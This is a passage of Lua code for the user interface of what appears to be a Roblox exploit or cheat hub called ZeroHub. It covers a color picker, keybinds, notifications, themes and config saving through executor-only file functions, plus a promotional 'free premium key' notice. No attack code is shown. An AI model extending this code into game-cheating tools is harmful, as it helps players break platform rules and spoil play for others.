			TextColor3 = Color3.fromRGB(255, 255, 255),
			BackgroundColor3 = arg6,
			FontFace = font,
			Size = UDim2.new(1, 0, 1, 0),
			Text = arg4,
			ZIndex = 122,
		})

		fn17("UICorner", { CornerRadius = UDim.new(0, 2), Parent = TextButton3 })

		TextButton3.MouseEnter:Connect(function()
			fn15(TextButton3, { BackgroundColor3 = arg7 }, 0.2)
		end)

		TextButton3.MouseLeave:Connect(function()
			fn15(TextButton3, { BackgroundColor3 = arg6 }, 0.2)
		end)

		return TextButton3
	end

	local Confirm = fn38("Confirm", -10, theme.Accent, theme.AccentHover)
	local color2 = Color3.fromRGB
	local Cancel = fn38("Cancel", -85, Color3.fromRGB(13, 13, 17), color2(24, 24, 30))
	local flag7 = false
	local flag8 = false

	local function fn39(arg4)
		n3 = math.clamp((arg4.X - Frame4.AbsolutePosition.X) / Frame4.AbsoluteSize.X, 0, 1)
		n4 = 1 - math.clamp((arg4.Y - Frame4.AbsolutePosition.Y) / Frame4.AbsoluteSize.Y, 0, 1)
		fn36()
	end

	local function fn40(arg4)
		color = math.clamp((arg4.Y - Frame8.AbsolutePosition.Y) / Frame8.AbsoluteSize.Y, 0, 1)
		fn36()
	end

	Frame4.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag7 = true
			fn39(input.Position)
		end
	end)

	Frame8.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag8 = true
			fn40(input.Position)
		end
	end)

	local connection = UserInputService.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if flag7 then
				fn39(input.Position)
			end

			if flag8 then
				fn40(input.Position)
			end
		end
	end)

	local connection2 = UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag7 = false
			flag8 = false
		end
	end)

	local flag9 = false

	local function fn41(arg4)
		if flag9 then
			return
		end
		flag9 = true
		connection:Disconnect()
		connection2:Disconnect()

		if not arg4 then
			arg2:SetValue(value)
		end

		fn25(Frame2)
		fn15(TextButton, { BackgroundTransparency = 1 }, 0.18)

		task.delay(0.13, function()
			TextButton:Destroy()
		end)
	end

	ImageButton.MouseButton1Click:Connect(function()
		fn41(false)
	end)

	Cancel.MouseButton1Click:Connect(function()
		fn41(false)
	end)

	Confirm.MouseButton1Click:Connect(function()
		fn41(true)
	end)

	ImageButton.MouseEnter:Connect(function()
		fn15(ImageButton, { ImageColor3 = Color3.fromRGB(255, 255, 255) }, 0.2)
	end)

	ImageButton.MouseLeave:Connect(function()
		fn15(ImageButton, { ImageColor3 = theme.DimText }, 0.2)
	end)

	TextButton2.MouseEnter:Connect(function()
		fn15(TextButton2, { TextColor3 = Color3.fromRGB(180, 180, 190) }, 0.2)
	end)

	TextButton2.MouseLeave:Connect(function()
		fn15(TextButton2, { TextColor3 = theme.Text }, 0.2)
	end)

	fn36()
	TextButton.BackgroundTransparency = 1
	fn15(TextButton, { BackgroundTransparency = 0.65 }, 0.18)
	fn24(Frame2)
end

index3.AddColorPicker = function(arg, arg2, arg3)
	local tbl16 = arg3 or {}
	local default = tbl16.Default or Color3.fromRGB(255, 255, 255)
	local v18 = fn31(arg.Container)
	fn22(v18, tbl16)
	fn32(v18, tbl16.Text or "Colorpicker", theme.Title)

	if tbl16.Description then
		fn33(v18, tbl16.Description)
	end

	local Frame2 = fn17("Frame", {
		Name = "Colorpicker",
		Parent = v18,
		ZIndex = 2,
		BorderSizePixel = 0,
		BackgroundColor3 = default,
		AnchorPoint = Vector2.new(1, 0.5),
		Size = UDim2.new(0, 36, 0, 18),
		Position = UDim2.new(1, -8, 0.5, 0),
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame2 })

	fn17("UIStroke", {
		Thickness = 1,
		Color = theme.ElementStroke,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Parent = Frame2,
	})

	local TextButton = fn17("TextButton", { Parent = Frame2, Text = "", BackgroundTransparency = 1, Size = UDim2.new(1, 0, 1, 0), ZIndex = 3 })
	local tbl17

	tbl17 = {
		Type = "ColorPicker",
		Flag = arg2,
		Value = default,
		Callback = tbl16.Callback,
		Saved = {},
		SetValue = function(arg4, value, arg5)
			tbl17.Value = value
			Frame2.BackgroundColor3 = value

			if arg2 then
				tbl.Flags[arg2] = value
			end

			if not arg5 then
				fn19(tbl17.Callback, value)
			end
		end,
	}

	TextButton.MouseButton1Click:Connect(function()
		tbl:OpenColorPicker(tbl17, Frame2)
	end)

	if arg2 then
		tbl.Flags[arg2] = tbl17.Value
		tbl.Options[arg2] = tbl17
		fn13(tbl16.Text or "Colorpicker", "Color", arg2, arg)
	end

	return tbl17
end

tbl.BindKeybind = function(arg, arg2, arg3)
	local window = arg2.Window or tbl.Window

	local ImageButton = fn17("ImageButton", {
		Parent = fn17("Frame", {
			Name = "Keybind",
			Parent = arg2.Holder,
			BorderSizePixel = 0,
			BackgroundTransparency = 1,
			AnchorPoint = Vector2.new(1, 0.5),
			Size = UDim2.new(0, 18, 0, 18),
			Position = UDim2.new(1, -35, 0.5, 0),
			ZIndex = 5,
		}),
		BorderSizePixel = 0,
		AutoButtonColor = false,
		BackgroundTransparency = 1,
		ImageColor3 = theme.CogClosed,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Image = tbl12.Cog,
		Size = UDim2.new(1, -3, 1, -3),
		Position = UDim2.new(0.5, 0, 0.5, 0),
		ZIndex = 5,
	})

	local keybind = {
		Mode = arg3.Mode or "Toggle",
		Key = arg3.Default,
		Callback = arg3.Callback,
		Listening = false,
		Menu = nil,
		MenuParts = nil,
	}

	local function fn35()
		if not keybind.Key then
			return ". . ."
		end
		return keybind.Key.Name
	end

	local function fn36()
		if not keybind.Menu then
			return
		end
		local menu = keybind.Menu
		local menuParts = keybind.MenuParts
		keybind.Menu = nil
		keybind.Listening = false

		if keybind.Catcher then
			keybind.Catcher:Destroy()
			keybind.Catcher = nil
		end

		fn15(ImageButton, { Rotation = 0, ImageColor3 = theme.CogClosed }, 0.2)
		fn25(menu, menuParts)
	end

	fn30(fn36)

	local function fn37()
		tbl:CloseAllPopups()
		fn15(ImageButton, { Rotation = 90, ImageColor3 = theme.CogOpen }, 0.2)

		keybind.Catcher = fn17("TextButton", {
			Name = "KeybindCatcher",
			Parent = window.Screen,
			Text = "",
			AutoButtonColor = false,
			BorderSizePixel = 0,
			BackgroundTransparency = 1,
			Size = UDim2.new(1, 0, 1, 0),
			ZIndex = 109,
		})

		keybind.Catcher.MouseButton1Click:Connect(function()
			fn36()
		end)

		local Frame2 = fn17("Frame", {
			Name = "OpenKeybindMenu",
			Parent = window.Screen,
			BorderSizePixel = 0,
			BackgroundColor3 = theme.Panel,
			AnchorPoint = Vector2.new(1, 0),
			Size = UDim2.new(0, 180, 0, 65),
			Position = UDim2.fromOffset(ImageButton.AbsolutePosition.X + ImageButton.AbsoluteSize.X + settings.KeybindMenuOffset.X, ImageButton.AbsolutePosition.Y + ImageButton.AbsoluteSize.Y + settings.KeybindMenuOffset.Y),
			ZIndex = 110,
		})

		keybind.Menu = Frame2
		fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame2 })
		fn17("UIStroke", { Thickness = 1.5, Color = theme.Stroke, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = Frame2 })

		local Frame3 = fn17("Frame", {
			Name = "OpenKeybindMenuHolder",
			Parent = Frame2,
			BorderSizePixel = 0,
			BackgroundTransparency = 1,
			AnchorPoint = Vector2.new(0.5, 0.5),
			Size = UDim2.new(1, -10, 1, -10),
			Position = UDim2.new(0.5, 0, 0.5, 0),
			ZIndex = 111,
		})

		fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame3 })
		fn17("UIStroke", { Thickness = 1.5, Color = theme.Stroke, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = Frame3 })

		fn17("ImageLabel", {
			Parent = Frame3,
			BorderSizePixel = 0,
			BackgroundTransparency = 1,
			ImageColor3 = theme.KeybindMenuText,
			Image = tbl12.KeybindIcon,
			Size = UDim2.new(0, 20, 0, 20),
			Position = UDim2.new(0, 5, 0, 3),
			ZIndex = 111,
		})

		fn17("TextLabel", {
			Parent = Frame3,
			BorderSizePixel = 0,
			TextSize = 14,
			BackgroundTransparency = 1,
			FontFace = font,
			TextColor3 = theme.KeybindMenuText,
			Size = UDim2.new(0, 0, 0, 20),
			AutomaticSize = Enum.AutomaticSize.X,
			Text = "Keybind",
			Position = UDim2.new(0, 27, 0, 3),
			ZIndex = 111,
		})

		keybind.KeyLabel = fn17("TextLabel", {
			Name = "ActualKeybind",
			Parent = Frame3,
			BorderSizePixel = 0,
			TextSize = 14,
			BackgroundTransparency = 1,
			FontFace = font,
			TextColor3 = theme.KeybindMenuText,
			AnchorPoint = Vector2.new(1, 0),
			AutomaticSize = Enum.AutomaticSize.X,
			Size = UDim2.new(0, 0, 0, 20),
			Text = fn35(),
			Position = UDim2.new(1, -10, 0, 3),
			ZIndex = 111,
		})

		local TextButton = fn17("TextButton", {
			Parent = Frame3,
			Text = "",
			BackgroundTransparency = 1,
			Size = UDim2.new(0, 60, 0, 20),
			Position = UDim2.new(1, -65, 0, 3),
			ZIndex = 112,
		})

		local Frame4 = fn17("Frame", {
			Name = "Toggle/Hold Button",
			Parent = Frame3,
			BorderSizePixel = 0,
			BackgroundTransparency = 1,
			AnchorPoint = Vector2.new(0, 1),
			Size = UDim2.new(1, 0, 0, 20),
			Position = UDim2.new(0, 0, 1, -5),
			ZIndex = 111,
		})

		fn17("UIListLayout", {
			HorizontalAlignment = Enum.HorizontalAlignment.Center,
			Padding = UDim.new(0, 5),
			SortOrder = Enum.SortOrder.LayoutOrder,
			FillDirection = Enum.FillDirection.Horizontal,
			Parent = Frame4,
		})

		local function fn38(arg4, arg5)
			local Frame5 = fn17("Frame", {
				Name = arg4,
				Parent = Frame4,
				LayoutOrder = arg5,
				BorderSizePixel = 0,
				BackgroundColor3 = keybind.Mode == arg4 and theme.Accent or theme.KeybindModeOff,
				Size = UDim2.new(0, 78, 1, 0),
				ZIndex = 111,
			})

			fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame5 })
			fn17("UIStroke", { Color = theme.Stroke, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = Frame5 })

			return Frame5, (fn17("TextButton", {
				Parent = Frame5,
				BorderSizePixel = 0,
				TextSize = 14,
				TextColor3 = Color3.fromRGB(255, 255, 255),
				BackgroundTransparency = 1,
				FontFace = font,
				Size = UDim2.new(1, 0, 1, 0),
				Text = arg4,
				ZIndex = 112,
			}))
		end

		local Toggle, v18 = fn38("Toggle", 1)
		local Hold, v19 = fn38("Hold", 2)
		local v20 = Toggle
		local v21 = Hold

		local function fn39()
			fn15(v20, { BackgroundColor3 = keybind.Mode == "Toggle" and theme.Accent or theme.KeybindModeOff }, 0.2)
			fn15(v21, { BackgroundColor3 = keybind.Mode == "Hold" and theme.Accent or theme.KeybindModeOff }, 0.2)
		end

		v18.MouseButton1Click:Connect(function()
			keybind.Mode = "Toggle"
			fn39()
		end)

		v19.MouseButton1Click:Connect(function()
			keybind.Mode = "Hold"
			fn39()
		end)

		TextButton.MouseButton1Click:Connect(function()
			if keybind.Listening then
				return
			end
			keybind.Listening = true

			task.spawn(function()
				local tbl16 = { ".", ". .", ". . ." }
				local n3 = 1

				while keybind.Listening and keybind.KeyLabel do
					keybind.KeyLabel.Text = tbl16[n3]
					n3 = n3 % 3 + 1
					task.wait(0.25)
				end
			end)
		end)

		keybind.MenuParts = fn24(Frame2)
	end

	ImageButton.MouseButton1Click:Connect(function()
		if keybind.Menu then
			fn36()
		else
			fn37()
		end
	end)

	fn14(UserInputService.InputBegan, function(arg4, arg5)
		if keybind.Listening and arg4.UserInputType == Enum.UserInputType.Keyboard then
			keybind.Key = arg4.KeyCode
			keybind.Listening = false

			if keybind.KeyLabel then
				keybind.KeyLabel.Text = fn35()
			end

			return
		end

		if arg5 then
			return
		end

		if keybind.Key and arg4.KeyCode == keybind.Key then
			if keybind.Mode == "Toggle" then
				arg2:SetValue(not arg2.Value)
			else
				arg2:SetValue(true)
			end

			fn19(keybind.Callback, keybind.Key)
		end
	end)

	fn14(UserInputService.InputEnded, function(arg4)
		if keybind.Mode == "Hold" and keybind.Key and arg4.KeyCode == keybind.Key then
			arg2:SetValue(false)
		end
	end)

	arg2.Keybind = keybind
	return keybind
end

local tbl16 = {
	Info = { Icon = "rbxassetid://83474456355516", Color = Color3.fromRGB(121, 121, 231) },
	Success = { Icon = "rbxassetid://104017061818006", Color = Color3.fromRGB(56, 186, 91) },
	Warning = { Icon = "rbxassetid://121692565210966", Color = Color3.fromRGB(206, 146, 46) },
	Error = { Icon = "rbxassetid://87330550858647", Color = Color3.fromRGB(206, 51, 66) },
}

local function fn35()
	local n3 = 8

	for _, v18 in ipairs(tbl10) do
		fn15(v18.Gui, { Position = UDim2.new(1, -8, 1, -n3) }, 0.35, Enum.EasingStyle.Quint)
		n3 = n3 + v18.Gui.AbsoluteSize.Y + 6
	end
end

tbl.Notify = function(arg, arg2)
	local tbl17 = arg2 or {}
	local info = tbl16[tbl17.Type] or tbl16.Info
	local duration = tbl17.Duration or 5

	if not Frame then
		Frame = fn17("Frame", {
			Name = "Holder",
			Parent = fn17("ScreenGui", {
				Name = "EthosNotifications",
				ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
				ResetOnSpawn = false,
				IgnoreGuiInset = true,
				DisplayOrder = 9999,
				Parent = fn18(),
			}),
			BorderSizePixel = 0,
			BackgroundTransparency = 1,
			Size = UDim2.new(1, 0, 1, 0),
		})
	end

	flag5 = false

	local CanvasGroup = fn17("CanvasGroup", {
		Name = "Notification",
		Parent = Frame,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Panel,
		AnchorPoint = Vector2.new(1, 1),
		Size = UDim2.new(0, 320, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		Position = UDim2.new(1, 200, 1, -8),
		GroupTransparency = 1,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 8), Parent = CanvasGroup })

	fn17("UIStroke", {
		Transparency = 0.5,
		Thickness = 1.5,
		Color = theme.Stroke,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Parent = CanvasGroup,
	})

	fn17("UISizeConstraint", { MinSize = Vector2.new(320, 64), Parent = CanvasGroup })
	fn20(CanvasGroup, { Color = Color3.fromRGB(160, 160, 190), Size = 14, Transparency = 0.6, Offset = Vector2.new(0, 0) })

	local Frame2 = fn17("Frame", {
		Name = "IconBg",
		Parent = CanvasGroup,
		BorderSizePixel = 0,
		BackgroundColor3 = info.Color,
		BackgroundTransparency = 0.85,
		AnchorPoint = Vector2.new(0, 0.5),
		Size = UDim2.new(0, 36, 0, 36),
		Position = UDim2.new(0, 8, 0.5, 0),
	})

	fn17("UICorner", { CornerRadius = UDim.new(1, 0), Parent = Frame2 })

	fn17("ImageLabel", {
		Name = "Icon",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		ImageColor3 = info.Color,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Image = info.Icon,
		Size = UDim2.new(0, 22, 0, 22),
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})

	local Frame3 = fn17("Frame", {
		Name = "TextHolder",
		Parent = CanvasGroup,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 52, 0, 0),
		Size = UDim2.new(1, -62, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
	})

	fn17("UIListLayout", { Padding = UDim.new(0, 2), SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame3 })
	fn17("UIPadding", { PaddingTop = UDim.new(0, 14), PaddingBottom = UDim.new(0, 16), Parent = Frame3 })

	fn17("TextLabel", {
		Name = "Title",
		Parent = Frame3,
		LayoutOrder = 1,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		FontFace = font2,
		TextSize = 16,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextXAlignment = Enum.TextXAlignment.Left,
		TextWrapped = true,
		AutomaticSize = Enum.AutomaticSize.Y,
		Size = UDim2.new(1, 0, 0, 0),
		Text = tbl17.Title or "Notification",
	})

	if tbl17.Description then
		fn17("TextLabel", {
			Name = "Description",
			Parent = Frame3,
			LayoutOrder = 2,
			BorderSizePixel = 0,
			BackgroundTransparency = 1,
			FontFace = font3,
			TextSize = 13,
			TextColor3 = theme.SubText,
			TextXAlignment = Enum.TextXAlignment.Left,
			TextWrapped = true,
			AutomaticSize = Enum.AutomaticSize.Y,
			Size = UDim2.new(1, 0, 0, 0),
			Text = tbl17.Description,
		})
	end

	local Frame4 = fn17("Frame", {
		Name = "TimeRemainingLine",
		Parent = CanvasGroup,
		BorderSizePixel = 0,
		BackgroundColor3 = info.Color,
		AnchorPoint = Vector2.new(0, 1),
		Size = UDim2.new(1, -50, 0, 3),
		Position = UDim2.new(0, 0, 1, 0),
	})

	local TextButton = fn17("TextButton", { Parent = CanvasGroup, Text = "", BackgroundTransparency = 1, Size = UDim2.new(1, 0, 1, 0), ZIndex = 5 })
	flag5 = true
	local tbl18 = { Gui = CanvasGroup }
	table.insert(tbl10, 1, tbl18)

	local function fn36()
		if tbl18.Dismissed then
			return
		end
		tbl18.Dismissed = true

		for i, v18 in ipairs(tbl10) do
			if v18 == tbl18 then
				table.remove(tbl10, i)
				break
			end
		end

		fn15(CanvasGroup, { Position = CanvasGroup.Position + UDim2.fromOffset(220, 0), GroupTransparency = 1 }, 0.35, Enum.EasingStyle.Quint)
		fn35()

		task.delay(0.32, function()
			if CanvasGroup then
				CanvasGroup:Destroy()
			end
		end)
	end

	TextButton.MouseButton1Click:Connect(fn36)
	task.wait()
	fn35()
	fn15(CanvasGroup, { GroupTransparency = 0 }, 0.35, Enum.EasingStyle.Quint)
	fn15(Frame4, { Size = UDim2.new(0, -50, 0, 3) }, duration, Enum.EasingStyle.Linear)
	task.delay(duration, fn36)
	return { Dismiss = fn36 }
end

tbl.SetAccent = function(arg, accent)
	theme.Accent = accent
	theme.AccentHover = accent:Lerp(Color3.new(1, 1, 1), 0.18)
	theme.AccentClick = accent:Lerp(Color3.new(1, 1, 1), 0.22)
	theme.AccentText = accent:Lerp(Color3.new(1, 1, 1), 0.3)
	theme.SliderFill = accent

	for _, v18 in ipairs(tbl9) do
		pcall(v18)
	end

	pcall(function()
		tbl:ApplyFullTheme()
	end)
end

tbl.ApplyFullTheme = function()
	local window = tbl.Window
	if not window or not window.Main then
		return
	end

	pcall(function()
		window.Main.BackgroundColor3 = theme.Background
	end)

	local fn36 = nil

	fn36 = function(arg)
		if not arg then
			return
		end

		local ok3, result2 = pcall(function()
			return arg:GetChildren()
		end)

		if not ok3 or not result2 then
			return
		end

		for _, v18 in ipairs(result2) do
			if v18 and typeof(v18) == "Instance" then
				pcall(function()
					local name = v18.Name

					if v18:IsA("Frame") then
						if name == "Groupbox" then
							v18.BackgroundColor3 = theme.Panel
						elseif name == "TopBar" then
							v18.BackgroundColor3 = theme.Panel
						elseif name == "Dropdown" then
							v18.BackgroundColor3 = theme.ElementBackground
						elseif name == "Track" then
							v18.BackgroundColor3 = theme.SliderTrack
						elseif name == "Fill" then
							v18.BackgroundColor3 = theme.SliderFill
						elseif name == "TabsHolder" then
							v18.BackgroundColor3 = theme.Background
						elseif name == "Checkmark" then
							local tick_ = v18:FindFirstChild("Tick")

							if tick_ and tick_.ImageTransparency > 0.5 then
								v18.BackgroundColor3 = theme.ElementBackground
							else
								v18.BackgroundColor3 = theme.Accent
							end
						end
					elseif v18:IsA("ScrollingFrame") then
						if name == "TabsScroller" then
							v18.BackgroundColor3 = theme.Background
						end
					elseif v18:IsA("TextLabel") then
						if name == "Title" and v18.TextSize <= 15 then
							v18.TextColor3 = theme.Text
						elseif name == "Description" then
							v18.TextColor3 = theme.SubText
						elseif name == "GroupboxTitle" then
							v18.TextColor3 = theme.GroupboxTitle
						end
					elseif v18:IsA("TextBox") then
						v18.BackgroundColor3 = theme.ElementBackground
						v18.TextColor3 = theme.TextboxText
					elseif v18:IsA("UIStroke") then
						local parent = v18.Parent

						if parent then
							local name2 = parent.Name

							if name2 == "Groupbox" or name2 == "Main" then
								v18.Color = theme.Stroke
							elseif name2 == "Checkmark" or name2 == "Dropdown" or name2 == "Track" then
								v18.Color = theme.ElementStroke
							end
						end
					end
				end)

				pcall(fn36, v18)
			end
		end
	end

	pcall(fn36, window.Main)

	for _, sliderFill in ipairs(tbl.SliderFills) do
		pcall(function()
			if sliderFill and sliderFill.Parent then
				sliderFill.BackgroundColor3 = theme.SliderFill
			end
		end)
	end
end

tbl.CreateSettingsTab = function(arg, arg2)
	local str4 = "ZeroHub/Zero_Configs"

	pcall(function()
		if not isfolder("ZeroHub/Zero_Configs") then
			makefolder("ZeroHub/Zero_Configs")
		end
	end)

	local function fn36()
		local tbl17 = {}

		pcall(function()
			for _, v18 in ipairs(listfiles("ZeroHub/Zero_Configs")) do
				local match = tostring(v18):match("([^/\\]+)%.json$")

				if match then
					table.insert(tbl17, match)
				end
			end
		end)

		return tbl17
	end

	local function fn37(arg3)
		if typeof(arg3) == "Color3" then
			return {
				__type = "Color3",
				R = math.floor(arg3.R * 255 + 0.5),
				G = math.floor(arg3.G * 255 + 0.5),
				B = math.floor(arg3.B * 255 + 0.5),
			}
		end

		return arg3
	end

	local function fn38(arg3)
		if type(arg3) == "table" and arg3.__type == "Color3" then
			return Color3.fromRGB(arg3.R or 255, arg3.G or 255, arg3.B or 255)
		end
		return arg3
	end

	local function fn39()
		local tbl17 = { Flags = {}, Saved = {}, Keybinds = {}, Collapsed = {} }

		for k, option in pairs(tbl.Options) do
			if not tostring(k):match("^_") or k == "_ZeroAutoHide" or k == "_ZeroScriptUsers" then
				if option.Value ~= nil then
					tbl17.Flags[k] = fn37(option.Value)
				end

				if option.Type == "ColorPicker" and option.Saved then
					local tbl18 = {}

					for _, v18 in ipairs(option.Saved) do
						table.insert(tbl18, fn37(v18))
					end

					tbl17.Saved[k] = tbl18
				end

				if option.Type == "Toggle" and option.Keybind and option.Keybind.Key then
					tbl17.Keybinds[k] = { Key = option.Keybind.Key.Name, Mode = option.Keybind.Mode }
				end
			end
		end

		for _, v18 in ipairs(tbl11) do
			tbl17.Collapsed[v18.Name] = v18.Collapsed and true or false
		end

		return tbl17
	end

	local function fn40(arg3)
		if type(arg3) ~= "table" then
			return
		end
		local tbl17 = { _ZeroPremade = true }
		local v18 = pairs
		local flags = arg3.Flags or {}

		for k, flag7 in v18(flags) do
			if not tbl17[k] then
				local v19 = tbl.Options[k]

				if v19 and v19.SetValue then
					pcall(function()
						v19:SetValue(fn38(flag7))
					end)
				end
			end
		end

		local v19 = pairs
		local saved = arg3.Saved or {}

		for k, v20 in v19(saved) do
			local v21 = tbl.Options[k]

			if v21 and v21.Type == "ColorPicker" then
				v21.Saved = {}

				for _, v22 in ipairs(v20) do
					table.insert(v21.Saved, fn38(v22))
				end
			end
		end

		local v20 = pairs
		local keybinds = arg3.Keybinds or {}

		for k, keybind in v20(keybinds) do
			local v21 = tbl.Options[k]

			if v21 and v21.Keybind then
				v21.Keybind.Mode = keybind.Mode or v21.Keybind.Mode

				if keybind.Key and Enum.KeyCode[keybind.Key] then
					v21.Keybind.Key = Enum.KeyCode[keybind.Key]
				end
			end
		end

		local v21 = pairs
		local collapsed = arg3.Collapsed or {}

		for k, v22 in v21(collapsed) do
			for _, v23 in ipairs(tbl11) do
				if v23.Name == k and v23.SetCollapsed then
					pcall(function()
						v23:SetCollapsed(v22)
					end)

					break
				end
			end
		end
	end

	local function fn41(arg3)
		if not arg3 or arg3 == "" then
			tbl:Notify({ Title = "Config", Description = "Enter a config name first.", Type = "Warning" })
			return false
		end

		local ok3 = pcall(function()
			writefile(str4 .. "/" .. arg3 .. ".json", HttpService:JSONEncode(fn39()))
		end)

		tbl:Notify({
			Title = "Config",
			Description = ok3 and "Saved '" .. arg3 .. "'." or "Failed to save.",
			Type = ok3 and "Success" or "Error",
		})

		return ok3
	end

	local function fn42(arg3)
		if not arg3 or arg3 == "" then
			tbl:Notify({ Title = "Config", Description = "Select a config to load.", Type = "Warning" })
			return
		end

		local ok3, result2 = pcall(function()
			return HttpService:JSONDecode(readfile(str4 .. "/" .. arg3 .. ".json"))
		end)

		if ok3 and type(result2) == "table" then
			fn40(result2)
			tbl:Notify({ Title = "Config", Description = "Loaded '" .. arg3 .. "'.", Type = "Success" })
		else
			tbl:Notify({ Title = "Config", Description = "Failed to load.", Type = "Error" })
		end
	end

	local settings2 = arg2:AddCategory("SETTINGS")
	local Interface = settings2:AddTab("Interface")
	local Configuration = settings2:AddTab("Configuration")
	local v18 = settings2:AddTab("NOTICE !"):AddGroupbox("FREE PREMIUM KEY")
	local v19 = v18:AddLabel("PLEASE IF YOU ARE READING THIS AND WANT A FREE PREMIUM KEY RECORD A GOOD SHOWCASE AND YOU WILL EXTEND YOUR PREMIUM KEY BY 1 DAY EVERY TIME YOU UPLOAD", theme.AccentText)
	v19.Label.TextSize = 17
	v19.Label.FontFace = font2
	local uiPadding = v19.Label:FindFirstChildOfClass("UIPadding")

	if uiPadding then
		uiPadding.PaddingTop = UDim.new(0, 14)
		uiPadding.PaddingBottom = UDim.new(0, 18)
		uiPadding.PaddingLeft = UDim.new(0, 10)
		uiPadding.PaddingRight = UDim.new(0, 10)
	end

	local v20 = v18:AddLabel("DM 1433538094988005528 AND YOU WILL BE WHITELISTED +1 DAY EVERY VIDEO (HIGH QUALITY VIDEOS ONLY)", theme.Text)
	v20.Label.TextSize = 15
	v20.Label.FontFace = font3
	local uiPadding2 = v20.Label:FindFirstChildOfClass("UIPadding")

	if uiPadding2 then
		uiPadding2.PaddingTop = UDim.new(0, 12)
		uiPadding2.PaddingBottom = UDim.new(0, 12)
		uiPadding2.PaddingLeft = UDim.new(0, 14)
		uiPadding2.PaddingRight = UDim.new(0, 14)
	end

	local parent = v20.Label.Parent

	if parent then
		local Frame2 = fn17("Frame", {
			Name = "DmBorder",
			Parent = parent,
			BorderSizePixel = 0,
			BackgroundTransparency = 1,
			Size = UDim2.new(1, -10, 1, -6),
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, 0.5, 0),
			ZIndex = 0,
		})

		fn17("UICorner", { CornerRadius = UDim.new(0, 6), Parent = Frame2 })

		fn17("UIStroke", {
			Thickness = 1,
			Color = theme.Stroke,
			Transparency = 0.3,
			ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
			Parent = Frame2,
		})
	end

	local tbl17 = {
		Violet = {
			Accent = Color3.fromRGB(138, 121, 231),
			SliderFill = Color3.fromRGB(138, 121, 231),
			AccentText = Color3.fromRGB(170, 155, 240),
			Panel = Color3.fromRGB(18, 16, 28),
			Background = Color3.fromRGB(12, 10, 20),
			Stroke = Color3.fromRGB(32, 28, 52),
			ElementBackground = Color3.fromRGB(14, 12, 24),
			ElementStroke = Color3.fromRGB(28, 25, 48),
		},
		Crimson = {
			Accent = Color3.fromRGB(206, 51, 66),
			SliderFill = Color3.fromRGB(206, 51, 66),
			AccentText = Color3.fromRGB(230, 80, 95),
			Panel = Color3.fromRGB(24, 12, 14),
			Background = Color3.fromRGB(16, 8, 10),
			Stroke = Color3.fromRGB(45, 22, 26),
			ElementBackground = Color3.fromRGB(20, 10, 12),
			ElementStroke = Color3.fromRGB(40, 20, 24),
		},
		Emerald = {
			Accent = Color3.fromRGB(40, 150, 70),
			SliderFill = Color3.fromRGB(56, 186, 91),
			AccentText = Color3.fromRGB(80, 200, 110),
			Panel = Color3.fromRGB(12, 20, 14),
			Background = Color3.fromRGB(8, 14, 10),
			Stroke = Color3.fromRGB(22, 38, 26),
			ElementBackground = Color3.fromRGB(10, 18, 12),
			ElementStroke = Color3.fromRGB(20, 34, 24),
		},
		Amber = {
			Accent = Color3.fromRGB(180, 125, 30),
			SliderFill = Color3.fromRGB(206, 146, 46),
			AccentText = Color3.fromRGB(220, 170, 70),
			Panel = Color3.fromRGB(22, 18, 10),
			Background = Color3.fromRGB(16, 12, 6),
			Stroke = Color3.fromRGB(40, 32, 16),
			ElementBackground = Color3.fromRGB(18, 14, 8),
			ElementStroke = Color3.fromRGB(36, 28, 14),
		},
		Rose = {
			Accent = Color3.fromRGB(200, 80, 130),
			SliderFill = Color3.fromRGB(231, 110, 160),
			AccentText = Color3.fromRGB(240, 140, 180),
			Panel = Color3.fromRGB(22, 14, 18),
			Background = Color3.fromRGB(16, 8, 12),
			Stroke = Color3.fromRGB(40, 24, 32),
			ElementBackground = Color3.fromRGB(18, 10, 14),
			ElementStroke = Color3.fromRGB(36, 22, 30),
		},
		Cyan = {
			Accent = Color3.fromRGB(40, 160, 175),
			SliderFill = Color3.fromRGB(64, 196, 209),
			AccentText = Color3.fromRGB(90, 210, 220),
			Panel = Color3.fromRGB(10, 20, 22),
			Background = Color3.fromRGB(6, 14, 16),
			Stroke = Color3.fromRGB(18, 36, 40),
			ElementBackground = Color3.fromRGB(8, 18, 20),
			ElementStroke = Color3.fromRGB(16, 32, 36),
		},
		Mono = {
			Accent = Color3.fromRGB(50, 50, 60),
			SliderFill = Color3.fromRGB(150, 150, 165),
			AccentText = Color3.fromRGB(200, 200, 210),
			Panel = Color3.fromRGB(22, 22, 28),
			Background = Color3.fromRGB(14, 14, 18),
			Stroke = Color3.fromRGB(24, 24, 30),
